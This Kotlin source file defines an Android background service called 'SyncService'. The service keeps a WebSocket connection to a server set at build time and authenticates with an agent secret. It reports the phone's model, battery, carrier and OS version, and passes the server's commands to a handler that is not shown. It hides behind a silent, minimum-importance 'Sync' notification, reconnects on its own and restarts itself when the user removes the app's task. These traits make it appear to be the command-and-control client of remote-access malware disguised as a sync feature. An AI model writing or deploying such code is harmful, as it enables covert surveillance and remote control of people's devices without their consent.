package com.sync.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import java.util.concurrent.TimeUnit

class SyncService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var ws: WebSocket? = null
    private var retry = 1000L
    private var isConnecting = false
    private var reconnectJob: Job? = null
    private var healthJob: Job? = null

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .writeTimeout(0, TimeUnit.MILLISECONDS)
        .retryOnConnectionFailure(true)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg("جاري الاتصال...")
        connect()
        startHealthCheck()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (ws == null && !isConnecting) connect()
        return START_REDELIVER_INTENT
    }

    private fun startHealthCheck() {
        healthJob?.cancel()
        healthJob = scope.launch {
            while (isActive) {
                delay(30000)
                try {
                    if (ws == null && !isConnecting) {
                        connect()
                    } else {
                        ws?.send("ping")
                    }
                } catch (e: Exception) {
                    try { ws?.close(1000, "Health") } catch (_: Exception) {}
                    ws = null
                    connect()
                }
            }
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartServiceIntent = Intent(applicationContext, SyncService::class.java)
            restartServiceIntent.setPackage(packageName)
            val restartServicePendingIntent = PendingIntent.getService(
                this, 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmService = getSystemService(ALARM_SERVICE) as AlarmManager
            alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                android.os.SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
            )
        } catch (e: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    private fun startFg(status: String = "متصل") {
        val ch = "sync_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val c = NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_MIN)
            c.setShowBadge(false)
            c.enableLights(false)
            c.enableVibration(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(c)
        }
        val n = NotificationCompat.Builder(this, ch)
            .setContentTitle("Sync")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(1, n)
    }

    private fun connect() {
        if (isConnecting || ws != null) return
        isConnecting = true

        val req = try {
            Request.Builder()
                .url(BuildConfig.SERVER_URL)
                .addHeader("X-Agent-Key", BuildConfig.AGENT_SECRET)
                .addHeader("model", "${Build.MANUFACTURER} ${Build.MODEL}")
                .addHeader("battery", DeviceInfo.getBattery(this))
                .addHeader("version", "Android ${Build.VERSION.RELEASE}")
                .addHeader("provider", DeviceInfo.getProvider(this))
                .build()
        } catch (e: Exception) {
            isConnecting = false
            scheduleReconnect()
            return
        }

        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) {
                isConnecting = false
                retry = 1000L
                startFg("✅ متصل")
            }

            override fun onMessage(w: WebSocket, t: String) {
                try {
                    if (t == "pong") return
                    AdvancedHandler(this@SyncService, w).handle(t)
                } catch (e: Exception) {}
            }

            override fun onFailure(w: WebSocket, e: Throwable, r: Response?) {
                isConnecting = false
                ws = null
                startFg("⏳ إعادة الاتصال...")
                scheduleReconnect()
            }

            override fun onClosed(w: WebSocket, c: Int, r: String) {
                isConnecting = false
                ws = null
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            delay(retry)
            retry = (retry * 2).coerceAtMost(30000L)
            connect()
        }
    }

    override fun onDestroy() {
        try { ws?.close(1000, "Destroy") } catch (e: Exception) {}
        reconnectJob?.cancel()
        healthJob?.cancel()
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        fun start(c: Context) {
            try {
                val i = Intent(c, SyncService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    c.startForegroundService(i)
                else c.startService(i)
            } catch (e: Exception) {}
        }
    }
}
